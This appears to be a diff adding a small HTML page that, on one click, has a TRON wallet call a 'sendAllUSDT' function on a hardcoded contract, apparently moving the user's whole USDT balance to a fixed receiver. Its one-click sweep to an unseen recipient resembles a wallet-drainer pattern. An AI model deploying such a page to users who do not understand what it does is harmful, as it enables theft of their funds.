@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send USDT</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
+<body>
+  <h2>Send All USDT</h2>
+  <button id="sendBtn">Send USDT to Receiver</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  <script>
+    const contractAddress = "TYrS3KVuwSUKZwxXr56GA5jQUBpka8Kf3F";
+    const fullNode = "https://api.trongrid.io";
+    const solidityNode = "https://api.trongrid.io";
+    const eventServer = "https://api.trongrid.io";
+
+    async function sendAllUSDT() {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert("Please open this page in Trust Wallet DApp browser with TRON network");
+        return;
+      }
+
+      const tronWeb = window.tronWeb;
+      const contract = await tronWeb.contract([
+        {
+          "inputs": [],
+          "name": "sendAllUSDT",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }
+      ], contractAddress);
+
+      try {
+        const tx = await contract.sendAllUSDT().send();
+        alert("Transaction sent! TX ID: " + tx);
+      } catch (err) {
+        alert("Transaction failed: " + err.message);
+      }
+    }
+
+    document.getElementById("sendBtn").onclick = sendAllUSDT;
+  </script>
+</body>
+</html>
